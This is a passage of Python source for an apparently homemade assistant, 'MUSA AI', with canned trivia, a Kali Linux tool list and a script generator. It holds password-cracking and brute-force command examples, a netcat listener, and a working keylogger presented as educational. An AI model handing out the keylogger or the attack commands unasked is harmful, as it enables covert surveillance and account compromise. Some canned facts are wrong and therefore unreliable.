     → Certifications: OSCP, CEH, CISSP

  5. Trading (High Risk!)
     → Stock market
     → Crypto (very volatile)
     → Forex

  6. Digital Products
     → Sell courses online
     → Ebooks
     → Software tools

Best Advice:
  → Learn a high-income skill first
  → Skills → Service → Scale
  → Don't quit your job too early
  → Emergency fund = 6 months expenses
  → Invest 20% of earnings
""",

    # ==================== SPORTS ====================
    "cricket": """
🏏 CRICKET - COMPLETE GUIDE

Overview:
  Most popular sport in South Asia & parts of world.
  Played between 2 teams of 11 players.

Formats:
  • Test Cricket    → 5 days, traditional form
  • ODI (One Day)   → 50 overs per side
  • T20             → 20 overs per side (most popular now)

Pakistan Cricket:
  ICC Rankings (fluctuates):
  Famous Players:
  → Imran Khan      → Greatest all-rounder
  → Wasim Akram     → Greatest left-arm fast bowler
  → Javed Miandad   → Greatest batsman
  → Shahid Afridi   → T20 legend
  → Babar Azam      → Current #1 batsman
  → Shaheen Afridi  → Best fast bowler

World Cup Winners (ODI):
  1975 - West Indies
  1983 - India
  1987 - Australia
  1992 - Pakistan ★
  1996 - Sri Lanka
  1999 - Australia
  2003 - Australia
  2007 - Australia
  2011 - India
  2015 - Australia
  2019 - England
  2023 - Australia

Records:
  Most Test runs: Sachin Tendulkar (India) - 15,921
  Most Test wickets: Muttiah Muralitharan (Sri Lanka) - 800
  Fastest T20 century: Many players (30 balls)
""",

    "football": """
⚽ FOOTBALL (SOCCER) - WORLD GAME

Most Popular sport on Earth!
  ~4 Billion fans worldwide

Major Leagues:
  • Premier League      → England (Most popular)
  • La Liga             → Spain (Real Madrid, Barca)
  • Serie A             → Italy
  • Bundesliga          → Germany
  • Ligue 1             → France
  • MLS                 → USA

FIFA World Cup Winners:
  Brazil      → 5 times (1958,62,70,94,2002)
  Germany     → 4 times
  Italy       → 4 times
  Argentina   → 3 times (2022 - Messi!)
  France      → 2 times
  England     → 1 time (1966)

GOAT Debate:
  Lionel Messi (Argentina):
  → 8 Ballon d'Or awards
  → World Cup 2022 winner
  → Most career goals in football

  Cristiano Ronaldo (Portugal):
  → 5 Ballon d'Or awards
  → Most international goals (130+)

Positions:
  Goalkeeper, Defenders (CB/RB/LB)
  Midfielders (CM/CAM/CDM)
  Forwards (ST/RW/LW)
""",

    # ==================== PHILOSOPHY ====================
    "life meaning": """
🌟 WHAT IS THE MEANING OF LIFE?

This is humanity's oldest question. Different answers:

Religious Views:
  Islam:    → To worship Allah and follow His guidance
  Christianity → To love God and serve others
  Hinduism  → Dharma, karma, moksha (liberation)
  Buddhism  → End suffering, achieve Nirvana

Philosophical Views:
  Aristotle → Eudaimonia (flourishing/happiness)
  Camus     → Life is absurd; create your own meaning
  Sartre    → "Existence precedes essence" - you define yourself
  Nietzsche → Will to Power; become who you are

Scientific View:
  → Biologically: Survive and reproduce
  → No predetermined meaning
  → Humans create meaning

Common Human Meanings:
  ✦ Love & relationships
  ✦ Achievement & legacy
  ✦ Helping others
  ✦ Spiritual connection
  ✦ Creative expression
  ✦ Knowledge & learning

My Take:
  Meaning is personal. Choose what gives YOUR life
  purpose, pursue it with passion, and help others
  along the way.
""",

    # ==================== COUNTRIES ====================
    "uk": """
🇬🇧 UNITED KINGDOM

Full Name: United Kingdom of Great Britain and Northern Ireland
Capital: London
Population: ~67 Million
Currency: British Pound Sterling (GBP)
Language: English

Countries Within UK:
  • England      → Capital: London
  • Scotland     → Capital: Edinburgh
  • Wales        → Capital: Cardiff
  • N. Ireland   → Capital: Belfast

Key Facts:
  • Constitutional Monarchy
  • King: Charles III (since 2022)
  • PM: Rishi Sunak (2022-2024), Keir Starmer (2024-)
  • Industrial Revolution started here
  • Once had largest empire (British Empire)
  • Permanent UN Security Council member
  • Left EU in 2020 (Brexit)
""",

    "turkey": """
🇹🇷 TURKEY (TÜRKIYE)

Capital: Ankara
Largest City: Istanbul
Population: ~85 Million
Currency: Turkish Lira (TRY)
Language: Turkish
President: Recep Tayyip Erdoğan

Geography:
  • Transcontinental (Asia & Europe)
  • Bosphorus Strait divides it
  • Borders: Greece, Bulgaria, Georgia,
    Armenia, Iran, Iraq, Syria

History:
  • Ottoman Empire capital
  • Republic founded 1923 by Mustafa Kemal Atatürk
  • Member of NATO
  • EU candidate (not yet member)

Famous:
  • Istanbul (Hagia Sophia, Blue Mosque)
  • Cappadocia
  • Troy (ancient city)
  • Turkish cuisine: Kebab, Baklava, Turkish tea
""",

    "iran": """
🇮🇷 IRAN (PERSIA)

Capital: Tehran
Population: ~87 Million
Currency: Iranian Rial (IRR)
Language: Farsi (Persian)
Government: Islamic Republic
Supreme Leader: Ayatollah Khamenei

History:
  • One of world's oldest civilizations
  • Persian Empire (550 BC) - Cyrus the Great
  • Sassanid Empire (224-651 AD)
  • Arab conquest → Islam adopted (651 AD)
  • 1979 Islamic Revolution

Key Facts:
  • Major oil & gas reserves
  • Nuclear program controversy
  • Under US sanctions
  • Shia Muslim majority
  • Famous for carpets, poetry, architecture

Poets:
  • Rumi (Jalal ud-Din Rumi) - Greatest Persian poet
  • Hafez
  • Omar Khayyam
""",

    "afghanistan": """
🇦🇫 AFGHANISTAN

Capital: Kabul
Population: ~42 Million
Language: Pashto, Dari
Currency: Afghani (AFN)
Government: Taliban (since 2021)

Geography:
  • Landlocked in Central/South Asia
  • Borders: Pakistan, Iran, Turkmenistan,
    Uzbekistan, Tajikistan, China
  • Hindu Kush mountains

History:
  • Ancient Silk Road crossroads
  • Conquered by: Alexander, Mongols,
    Timur, Mughals, British
  • Soviet Invasion (1979-1989)
  • Taliban Rule (1996-2001)
  • US invasion after 9/11 (2001)
  • US withdrawal & Taliban return (2021)

Current Situation:
  • Taliban controls government
  • International aid limited
  • Women's rights severely restricted
  • Economic crisis
""",

    # ==================== FOOD ====================
    "biryani": """
🍛 BIRYANI - THE KING OF FOODS

Origin: Persia → Mughal India → South Asia
Word means: "Fried before cooking" (Persian: Beriyan)

Types:
  • Hyderabadi Biryani  → Dum style, most famous
  • Karachi Biryani     → Spicy, tomatoes heavy
  • Lahori Biryani      → Rich, less rice ratio
  • Sindhi Biryani      → Potatoes, tart taste
  • Lucknowi Biryani    → Light, aromatic
  • Bombay Biryani      → Potato & plum added

Basic Ingredients:
  • Basmati rice (aged, long grain)
  • Meat (chicken/mutton/beef)
  • Onions (fried golden brown)
  • Yogurt
  • Whole spices (cardamom, cloves, cinnamon)
  • Saffron
  • Mint & coriander
  • Desi ghee

Secret to Perfect Biryani:
  → Use aged basmati rice
  → Marinate meat minimum 2 hours
  → Golden fried onions (birista) - key!
  → Dum cooking (sealed slow cooking)
  → Layer rice and meat properly
""",
}

# ====================== KALI COMMANDS DATABASE ======================
KALI_COMMANDS = {
    "nmap":        {"desc": "Network port scanner", "example": "nmap -sV -sC target", "category": "Recon"},
    "gobuster":    {"desc": "Directory/subdomain bruter", "example": "gobuster dir -u http://target -w wordlist.txt", "category": "Recon"},
    "amass":       {"desc": "Subdomain enumeration", "example": "amass enum -d target.com", "category": "Recon"},
    "theharvester":{"desc": "Email/domain OSINT", "example": "theHarvester -d target.com -b all", "category": "Recon"},
    "whois":       {"desc": "Domain registration info", "example": "whois target.com", "category": "Recon"},
    "nikto":       {"desc": "Web server scanner", "example": "nikto -h http://target.com", "category": "Web"},
    "sqlmap":      {"desc": "SQL injection tool", "example": "sqlmap -u 'http://site.com/?id=1' --dbs", "category": "Web"},
    "burpsuite":   {"desc": "Web app proxy/tester", "example": "burpsuite (GUI)", "category": "Web"},
    "wfuzz":       {"desc": "Web fuzzer", "example": "wfuzz -c -w wordlist.txt http://target/FUZZ", "category": "Web"},
    "metasploit":  {"desc": "Exploitation framework", "example": "msfconsole", "category": "Exploit"},
    "searchsploit":{"desc": "Exploit database search", "example": "searchsploit vsftpd 2.3.4", "category": "Exploit"},
    "hydra":       {"desc": "Network brute forcer", "example": "hydra -l admin -P pass.txt target ssh", "category": "Passwords"},
    "john":        {"desc": "Password cracker", "example": "john --wordlist=rockyou.txt hash.txt", "category": "Passwords"},
    "hashcat":     {"desc": "GPU password cracker", "example": "hashcat -m 0 hash.txt rockyou.txt", "category": "Passwords"},
    "aircrack-ng": {"desc": "WiFi password cracker", "example": "aircrack-ng -w wordlist cap-file.cap", "category": "Wireless"},
    "wifite":      {"desc": "Auto WiFi attack tool", "example": "wifite", "category": "Wireless"},
    "wireshark":   {"desc": "Network packet analyzer", "example": "wireshark (GUI)", "category": "Network"},
    "tcpdump":     {"desc": "CLI packet capture", "example": "tcpdump -i eth0 -w capture.pcap", "category": "Network"},
    "netcat":      {"desc": "Swiss army knife net tool", "example": "nc -lvnp 4444", "category": "Network"},
    "linpeas":     {"desc": "Linux priv esc checker", "example": "./linpeas.sh", "category": "Post-Exploit"},
    "bloodhound":  {"desc": "AD attack path finder", "example": "bloodhound (GUI)", "category": "Post-Exploit"},
}

# ====================== ADVANCED SCRIPT GENERATOR ======================
def generate_advanced_script(task):
    task_lower = task.lower()

    if "port scan" in task_lower or "scanner" in task_lower:
        return '''#!/usr/bin/env python3
"""
Professional Advanced Port Scanner
Generated by MUSA AI v4.0
"""
import socket
import sys
import threading
from datetime import datetime

open_ports = []
lock = threading.Lock()

def scan_port(target, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                with lock:
                    open_ports.append(port)
                    print(f"  [OPEN] Port {port:5d} → {service}")
    except Exception:
        pass

def main():
    if len(sys.argv) < 2:
        target = input("Enter Target IP/Domain: ").strip()
    else:
        target = sys.argv[1]

    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror:
        print("[-] Cannot resolve hostname!")
        sys.exit(1)

    start_port = int(input("Start Port [default 1]: ") or 1)
    end_port = int(input("End Port [default 1024]: ") or 1024)

    print(f"""
╔══════════════════════════════════════╗
║     MUSA AI - PORT SCANNER v2.0     ║
╚══════════════════════════════════════╝
  Target  : {target} ({ip})
  Range   : {start_port} - {end_port}
  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
""")

    threads = []
    for port in range(start_port, end_port + 1):
        t = threading.Thread(target=scan_port, args=(ip, port))
        threads.append(t)
        t.start()
        if len(threads) >= 100:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

    print(f"""
  Scan Complete!
  Open Ports: {len(open_ports)}
  Ports: {sorted(open_ports)}
""")

if __name__ == "__main__":
    main()
'''

    elif "recon" in task_lower:
        return '''#!/usr/bin/env python3
"""
Professional Recon Automation Script
Generated by MUSA AI v4.0
"""
import subprocess
import sys
import os
from datetime import datetime

def banner():
    print("""
╔══════════════════════════════════════╗
║   MUSA AI - AUTO RECON TOOL v2.0   ║
╚══════════════════════════════════════╝""")

def run(cmd, output_file=None):
    print(f"\\n[*] Running: {' '.join(cmd)}")
    print("-" * 40)
    try:
        if output_file:
            with open(output_file, 'w') as f:
                subprocess.run(cmd, stdout=f, stderr=subprocess.DEVNULL)
            print(f"[+] Saved to: {output_file}")
        else:
            subprocess.run(cmd)
    except FileNotFoundError:
        print(f"[-] Tool not found: {cmd[0]}")
    except KeyboardInterrupt:
        print("\\n[!] Skipping...")

def main():
    banner()
    if len(sys.argv) < 2:
        target = input("\\nEnter Target (IP or domain): ").strip()
    else:
        target = sys.argv[1]

    folder = f"recon_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(folder, exist_ok=True)
    print(f"\\n[+] Output folder: {folder}/")

    # 1. Nmap scan
    run(["nmap", "-sV", "-sC", "-p-", "--open", "-T4", target],
        f"{folder}/nmap_full.txt")

    # 2. Directory brute force
    run(["gobuster", "dir", "-u", f"http://{target}",
         "-w", "/usr/share/wordlists/dirb/common.txt",
         "-t", "50", "-o", f"{folder}/dirs.txt"])

    # 3. Subdomain enum
    run(["gobuster", "dns", "-d", target,
         "-w", "/usr/share/wordlists/dns/subdomains-top1million-5000.txt",
         "-o", f"{folder}/subdomains.txt"])

    # 4. HTTP headers
    run(["curl", "-I", f"http://{target}"],
        f"{folder}/headers.txt")

    # 5. WHOIS
    run(["whois", target], f"{folder}/whois.txt")

    print(f"""
╔══════════════════════════════════════╗
║         RECON COMPLETED!            ║
║  Results saved in: {folder}/
╚══════════════════════════════════════╝""")

if __name__ == "__main__":
    main()
'''

    elif "web scraper" in task_lower or "scrape" in task_lower:
        return '''#!/usr/bin/env python3
"""
Professional Web Scraper
Generated by MUSA AI v4.0
Requirements: pip install requests beautifulsoup4
"""
import requests
from bs4 import BeautifulSoup
import json
import sys

def scrape_website(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36'
    }

    print(f"[*] Scraping: {url}")

    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"[-] Error: {e}")
        return

    soup = BeautifulSoup(response.content, 'html.parser')

    data = {
        'url': url,
        'title': soup.title.string if soup.title else 'No title',
        'links': [],
        'headings': [],
        'paragraphs': [],
        'images': [],
        'forms': []
    }

    # Extract links
    for a in soup.find_all('a', href=True):
        href = a['href']
        text = a.get_text(strip=True)
        data['links'].append({'text': text, 'href': href})

    # Extract headings
    for tag in ['h1', 'h2', 'h3', 'h4']:
        for h in soup.find_all(tag):
            data['headings'].append({'tag': tag, 'text': h.get_text(strip=True)})

    # Extract paragraphs
    for p in soup.find_all('p')[:10]:
        text = p.get_text(strip=True)
        if text:
            data['paragraphs'].append(text)

    # Extract images
    for img in soup.find_all('img'):
        data['images'].append({
            'src': img.get('src', ''),
            'alt': img.get('alt', '')
        })

    # Extract forms
    for form in soup.find_all('form'):
        inputs = [inp.get('name', '') for inp in form.find_all('input')]
        data['forms'].append({
            'action': form.get('action', ''),
            'method': form.get('method', 'GET'),
            'inputs': inputs
        })

    # Display results
    print(f"""
╔══════════════════════════════════════╗
║    SCRAPING RESULTS - MUSA AI       ║
╚══════════════════════════════════════╝

  Title     : {data['title']}
  Links     : {len(data['links'])}
  Headings  : {len(data['headings'])}
  Images    : {len(data['images'])}
  Forms     : {len(data['forms'])}

HEADINGS:""")

    for h in data['headings'][:5]:
        print(f"  [{h['tag'].upper()}] {h['text']}")

    print("\\nTOP LINKS:")
    for link in data['links'][:10]:
        print(f"  → {link['text'][:30]:30} | {link['href'][:50]}")

    if data['forms']:
        print("\\nFORMS FOUND:")
        for form in data['forms']:
            print(f"  Action: {form['action']}, Method: {form['method']}")
            print(f"  Inputs: {form['inputs']}")

    # Save JSON
    with open('scraped_data.json', 'w') as f:
        json.dump(data, f, indent=2)
    print("\\n[+] Full data saved to: scraped_data.json")

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else input("Enter URL: ").strip()
    if not url.startswith('http'):
        url = 'https://' + url
    scrape_website(url)
'''

    elif "keylogger" in task_lower:
        return '''#!/usr/bin/env python3
"""
Educational Keylogger - MUSA AI
FOR EDUCATIONAL PURPOSES ONLY
Requirements: pip install pynput
"""
from pynput import keyboard
import datetime
import os

LOG_FILE = "keylog.txt"

def on_press(key):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    try:
        char = key.char
        log_entry = char
    except AttributeError:
        if key == keyboard.Key.space:
            log_entry = " "
        elif key == keyboard.Key.enter:
            log_entry = "\\n"
        elif key == keyboard.Key.backspace:
            log_entry = "[BACK]"
        elif key == keyboard.Key.tab:
            log_entry = "[TAB]"
        else:
            log_entry = f"[{key.name.upper()}]"

    with open(LOG_FILE, 'a') as f:
        f.write(log_entry)

    print(f"[{timestamp}] Key: {log_entry}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\\n[*] Keylogger stopped.")
        return False

print("""
Educational Keylogger - MUSA AI
Press ESC to stop
""")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
'''

    elif "network" in task_lower and "monitor" in task_lower:
        return '''#!/usr/bin/env python3
"""
Network Monitor Tool - MUSA AI
Requirements: pip install scapy psutil
"""
import psutil
import time
import os
from datetime import datetime

def get_network_stats():
    stats = psutil.net_io_counters()
    return {
        'bytes_sent': stats.bytes_sent,
        'bytes_recv': stats.bytes_recv,
        'packets_sent': stats.packets_sent,
        'packets_recv': stats.packets_recv
    }

def format_bytes(bytes_val):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes_val < 1024:
            return f"{bytes_val:.1f} {unit}"
        bytes_val /= 1024
    return f"{bytes_val:.1f} TB"

def show_connections():
    print("\\nACTIVE CONNECTIONS:")
    print("-" * 60)
    conns = psutil.net_connections()
    for conn in conns[:15]:
        if conn.status == 'ESTABLISHED':
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else ""
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else ""
            print(f"  {laddr:25} → {raddr:25} [{conn.status}]")

def main():
    print("""
╔══════════════════════════════════════╗
║   MUSA AI - NETWORK MONITOR v1.0   ║
║   Press Ctrl+C to stop             ║
╚══════════════════════════════════════╝""")

    prev = get_network_stats()
    time.sleep(1)

    try:
        while True:
            os.system('clear' if os.name != 'nt' else 'cls')
            curr = get_network_stats()

            upload_speed = curr['bytes_sent'] - prev['bytes_sent']
            download_speed = curr['bytes_recv'] - prev['bytes_recv']

            print(f"""
  Time      : {datetime.now().strftime('%H:%M:%S')}
  Upload    : {format_bytes(upload_speed)}/s
  Download  : {format_bytes(download_speed)}/s
  Total Sent: {format_bytes(curr['bytes_sent'])}
  Total Recv: {format_bytes(curr['bytes_recv'])}""")

            show_connections()
            prev = curr
            time.sleep(2)

    except KeyboardInterrupt:
        print("\\n[*] Monitor stopped.")

if __name__ == "__main__":
    main()
'''

    else:
        return f'''#!/usr/bin/env python3
"""
Custom Script: {task}
Generated by MUSA AI v4.0
{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
import sys
import os
import subprocess
from datetime import datetime

def banner():
    print("""
╔══════════════════════════════════════╗
║      MUSA AI - CUSTOM SCRIPT       ║
╚══════════════════════════════════════╝""")
    print(f"  Task: {task}")
    print(f"  Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}")
    print()

def main():
    banner()
    print("[*] Starting task: {task}")
    print("[*] Script is ready - add your logic below")

    # === YOUR CODE HERE ===
    # Add your implementation below
    # Example:
    # target = input("Enter target: ")
    # print(f"Processing: {{target}}")
    # === END ===

    print("[+] Done!")

if __name__ == "__main__":
    main()
'''

# ====================== SMART RESPONSE ENGINE ======================
def get_intelligent_response(question):
    q = question.lower().strip()

    # Check knowledge base - exact and partial matches
    for key, value in KNOWLEDGE_BASE.items():
        if key in q or q in key:
            return value

    # Advanced pattern matching
    patterns = {
        # Greetings
        ("hi", "hello", "hey", "salam", "assalam", "helo"):
            "Hello Boss! I'm MUSA AI v4.0. I'm ready to help you with ANYTHING — ask me about science, history, tech, hacking, countries, programming, or anything else!",

        ("how are you", "how r you", "kya hal", "kaisa ho"):
            "I'm running perfectly at 100% efficiency! Ready to answer any question you have. What can I help you with today?",

        ("thank", "thanks", "shukriya", "jazakallah", "barakallah"):
            "You're welcome Boss! It's always my pleasure. Ask me anything else anytime!",

        ("good morning", "subah", "morning"):
            f"Good Morning Boss! Today is {datetime.now().strftime('%A, %B %d, %Y')}. I hope you have a productive day! How can I help you?",

        ("good night", "shab", "night", "raat"):
            "Good Night Boss! Rest well. I'll be here whenever you need me!",
    }

    for keys, response in patterns.items():
        if any(k in q for k in keys):
            return response

    # Topic detection with smart responses
    smart_responses = {}

    # Science topics
    if any(w in q for w in ["atom", "molecule", "chemistry", "element", "periodic"]):
        smart_responses["content"] = """⚗️ CHEMISTRY / ATOMIC SCIENCE

Atoms are the building blocks of all matter.

Key Facts:
  • Atom parts: Protons (+), Neutrons (0), Electrons (-)
  • Periodic Table: 118 known elements
  • Smallest element: Hydrogen (H)
  • Most abundant element in universe: Hydrogen
  • Most abundant in Earth's crust: Oxygen

Famous Scientists:
  • Dmitri Mendeleev → Created Periodic Table (1869)
  • Ernest Rutherford → Discovered atomic nucleus
  • Niels Bohr → Atomic model

States of Matter:
  Solid → Liquid → Gas → Plasma
  (as temperature/energy increases)

Chemical Bonding:
  • Ionic Bond     → Transfer of electrons (NaCl)
  • Covalent Bond  → Sharing of electrons (H₂O)
  • Metallic Bond  → Found in metals"""

    elif any(w in q for w in ["space", "universe", "galaxy", "star", "nasa", "cosmos"]):
        smart_responses["content"] = """🌌 SPACE & UNIVERSE

Universe Facts:
  • Age: 13.8 Billion years
  • Size: 93 Billion light years (observable)
  • Galaxies: ~2 Trillion
  • Stars: ~10²⁴ (more than grains of sand on Earth)

Our Galaxy:
  • Name: Milky Way
  • Type: Spiral galaxy
  • Stars: 100-400 Billion
  • Size: 100,000 light years across
  • Black hole at center: Sagittarius A*

Types of Stars:
  • Red Dwarf      → Smallest, most common
  • Yellow Dwarf   → Our Sun
  • Blue Giant     → Hottest, brightest
  • Neutron Star   → Collapsed star, super dense
  • Black Hole     → Gravity so strong light can't escape

Space Exploration:
  • Hubble Space Telescope → Stunning deep space images
  • James Webb (2022)      → Farthest images ever
  • ISS                    → 400km above Earth
  • Voyager 1              → Farthest human-made object"""

    elif any(w in q for w in ["dinosaur", "jurassic", "prehistoric", "fossil", "extinct"]):
        smart_responses["content"] = """🦕 DINOSAURS

Dinosaurs ruled Earth for ~165 Million years (Mesozoic Era)

Era Breakdown:
  • Triassic (252-201 Ma)   → First dinosaurs
  • Jurassic (201-145 Ma)   → Giants dominate
  • Cretaceous (145-66 Ma)  → Peak diversity

Famous Dinosaurs:
  • T-Rex           → King of dinosaurs, tiny arms, massive jaws
  • Velociraptor    → Smart, pack hunter (turkey-sized actually!)
  • Triceratops     → 3 horns, plant-eater
  • Brachiosaurus   → Giraffe-like neck, 30m tall
  • Stegosaurus     → Plates on back
  • Pterodactyl     → Flying reptile (not technically a dino)

Extinction:
  66 Million years ago: Asteroid hit Mexico (Chicxulub)
  → Dust blocked sunlight
  → Plants died
  → Food chain collapsed
  → 75% of all species went extinct

Survivors:
  Birds are modern descendants of theropod dinosaurs!
  Crocodiles, sharks also survived."""

    elif any(w in q for w in ["climate", "global warming", "environment", "carbon", "pollution"]):
        smart_responses["content"] = """🌍 CLIMATE CHANGE & ENVIRONMENT

The Problem:
  Earth's temperature rising due to greenhouse gases
  mainly from human activities (burning fossil fuels).

Key Facts:
  • Earth has warmed ~1.1°C since pre-industrial times
  • CO2 levels highest in 3 million years (420+ ppm)
  • Arctic ice melting 40% faster than predicted
  • Sea levels rising ~3.3mm/year
  • 1 million species at risk of extinction

Greenhouse Gases:
  • CO₂ → Burning coal, oil, gas
  • Methane → Livestock, landfills, gas leaks
  • N₂O → Agriculture, fertilizers

Effects:
  → More extreme weather (floods, droughts, hurricanes)
  → Rising sea levels (threatens coastal cities)
  → Species extinction
  → Food & water shortages
  → Health impacts

Solutions:
  → Renewable energy (solar, wind, hydro)
  → Electric vehicles
  → Reforestation
  → Carbon capture technology
  → Nuclear energy
  → Individual: reduce, reuse, recycle"""

    elif any(w in q for w in ["water", "ocean", "river", "sea"]):
        smart_responses["content"] = """💧 WATER - THE ESSENCE OF LIFE

Water Facts:
  • Chemical formula: H₂O
  • Covers 71% of Earth's surface
  • Only 3% is fresh water
  • Of that 3%, 69% is frozen in ice caps

Earth's Water:
  • Oceans    → 96.5% of all water
  • Ice caps  → 1.74%
  • Groundwater → 1.69%
  • Surface water (rivers, lakes) → tiny fraction

Water Cycle:
  Evaporation → Condensation → Precipitation → Collection
  (Sun heats) → (Forms clouds) → (Rain/Snow) → (Oceans/Rivers)

Human Need:
  • Body is 60% water
  • Can survive 3 weeks without food
  • Can only survive 3 DAYS without water
  • Need: 2-3 liters daily

Water Crisis:
  • 2.2 Billion people lack safe drinking water
  • By 2050, half world could face water scarcity
  • Pakistan has severe water stress"""

    if "content" in smart_responses:
        return smart_responses["content"]

    # Country/region detection
    country_hints = {
        "russia": "🇷🇺 Russia is the world's largest country (17.1M km²), spanning 11 time zones. Capital: Moscow. Population: ~145M. President: Vladimir Putin. Known for Siberia, Kremlin, Cold War with USA. Major nuclear & military power.",
        "japan": "🇯🇵 Japan is an island nation in East Asia. Capital: Tokyo. Population: ~125M. Known for: Technology (Sony, Toyota, Honda), Anime, Sushi, Mount Fuji, Samurai history. World's 3rd largest economy.",
        "brazil": "🇧🇷 Brazil is South America's largest country. Capital: Brasília. Largest city: São Paulo. Population: ~215M. Amazon Rainforest (60% in Brazil). Famous for Football (5x World Cup), Carnival, beaches.",
        "france": "🇫🇷 France is Western Europe's largest country. Capital: Paris. Population: ~68M. Known for: Eiffel Tower, fashion, cuisine, art, history. 6th largest economy. Permanent UN Security Council member.",
        "germany": "🇩🇪 Germany is Europe's largest economy. Capital: Berlin. Population: ~84M. Known for: Engineering (BMW, Mercedes, Volkswagen), World Wars history, October fest, Autobahn (no speed limit highway).",
        "australia": "🇦🇺 Australia is both a continent and country. Capital: Canberra. Largest city: Sydney. Population: ~26M. Known for: Kangaroos, Koalas, Great Barrier Reef, unique wildlife. 12th largest economy.",
        "canada": "🇨🇦 Canada is world's 2nd largest country (10M km²). Capital: Ottawa. Population: ~40M. Known for: Natural beauty, multicultural society, maple syrup, hockey. 8th largest economy.",
    }

    for country, response in country_hints.items():
        if country in q:
            return response

    # Math/calculation
    if any(w in q for w in ["calculate", "what is", "solve", "math"]) and any(c in q for c in "0123456789+-*/"):
        try:
            expr = ''.join(c for c in q if c in '0123456789+-*/.() ')
            expr = expr.strip()
            if expr:
                result = eval(expr)
                return f"🔢 Math Result:\n  {expr} = {result}"
        except:
            pass

    # Time/date
    if any(w in q for w in ["time", "date", "today", "year", "day"]):
        now = datetime.now()
        return f"""🕐 CURRENT DATE & TIME

  Date    : {now.strftime('%A, %B %d, %Y')}
  Time    : {now.strftime('%I:%M:%S %p')}
  Day     : {now.strftime('%A')}
  Month   : {now.strftime('%B')}
  Year    : {now.year}
  Week    : Week {now.isocalendar()[1]} of {now.year}"""

    # Coding help
    if any(w in q for w in ["code", "program", "function", "loop", "class", "error", "debug"]):
        return """💻 CODING HELP

I can help you with code! Please be more specific:

Tell me:
  → Which programming language? (Python, C++, JS, etc.)
  → What are you trying to do?
  → Share your code (if you have an error)

I specialize in:
  ✓ Python (Expert level)
  ✓ Bash/Shell scripting
  ✓ JavaScript basics
  ✓ SQL queries
  ✓ HTML/CSS basics

Example questions I can answer:
  → "Write a Python function to sort a list"
  → "How to handle exceptions in Python?"
  → "Write a bash script to backup files"
  → "Generate Python script for port scanner"
"""

    # Default intelligent response
    return f"""🤖 MUSA AI Response:

I understood your question: "{question}"

I have extensive knowledge in:
  📚 General Knowledge & World Facts
  🌍 Countries, History, Geography
  🔬 Science, Technology, Space
  🐍 Python Programming
  🐉 Kali Linux & Cybersecurity
  💰 Finance & Business
  🏥 Health & Medicine
  ⚽ Sports & Entertainment

To get the best answer, try being specific:
  ✓ "Tell me about World War 2"
  ✓ "Explain how Python works"  
  ✓ "What is machine learning"
  ✓ "Info about Pakistan"
  ✓ "How does blockchain work"
  ✓ "nmap help"
  ✓ "generate python script for port scanner"

Type 'help' to see all available commands.
"""

# ====================== MAIN PROCESSING ======================
def process_input(user_input):
    text = user_input.strip()
    text_lower = text.lower()

    if not text:
        return True

    # Remember input
    SESSION_MEMORY.append(text)

    # Exit commands
    if text_lower in ["exit", "quit", "bye", "goodbye", "khuda hafiz", "acha bye"]:
        speak("Thank you for using MUSA AI v4.0 Boss!")
        speak("Stay curious, keep learning, and remember — knowledge is power!")
        speak("Goodbye! Take care! 🌟")
        return False

    # Help
    if text_lower in ["help", "commands", "menu"]:
        print_section("MUSA AI v4.0 - ALL COMMANDS")
        print(f"""{Colors.WHITE}
  ┌─────────────────────────────────────────────────────┐
  │                  GENERAL QUESTIONS                  │
  ├─────────────────────────────────────────────────────┤
  │  Ask me ANYTHING in natural language:               │
  │  • "What is machine learning?"                      │
  │  • "Tell me about Pakistan"                         │
  │  • "Explain World War 2"                            │
  │  • "How does the internet work?"                    │
  │  • "What is Bitcoin?"                               │
  │  • "Tell me about Solar System"                     │
  │  • "History of Islam"                               │
  │  • "Info about Mughal Empire"                       │
  ├─────────────────────────────────────────────────────┤
  │                  KALI LINUX TOOLS                   │
  ├─────────────────────────────────────────────────────┤
  │  show kali          → All Kali tools                │
  │  nmap help          → Nmap complete guide           │
  │  metasploit help    → Metasploit guide              │
  │  sqlmap help        → SQLmap guide                  │
  │  hydra help         → Hydra guide                   │
  │  burp suite help    → Burp Suite guide              │
  │  kali linux         → Kali overview                 │
  ├─────────────────────────────────────────────────────┤
  │               SCRIPT GENERATION                     │
  ├─────────────────────────────────────────────────────┤
  │  generate script for port scanner                   │
  │  generate script for recon                          │
  │  generate script for web scraper                    │
  │  generate script for network monitor                │
  │  generate script for keylogger                      │
  ├─────────────────────────────────────────────────────┤
  │                   UTILITIES                         │
  ├─────────────────────────────────────────────────────┤
  │  show kali          → Kali tools list               │
  │  memory             → Recent questions              │
  │  clear              → Clear screen                  │
  │  time               → Current date/time             │
  │  help               → This menu                     │
  │  exit               → Quit                          │
  └─────────────────────────────────────────────────────┘
{Colors.ENDC}""")
        return True

    # Kali tools list
    if text_lower in ["show kali", "kali tools", "kali commands"]:
        print_section("KALI LINUX TOOLS - COMPLETE LIST")
        current_cat = ""
        for cmd, info in sorted(KALI_COMMANDS.items(), key=lambda x: x[1]['category']):
            cat = info.get("category", "Other")
            if cat != current_cat:
                current_cat = cat
                cprint(f"\n  🔹 {cat}", Colors.OKCYAN, bold=True)
            print(f"    {cmd:<15} → {info['desc']}")
            print(f"    {'':15}   Example: {Colors.GRAY}{info['example']}{Colors.ENDC}")
        return True

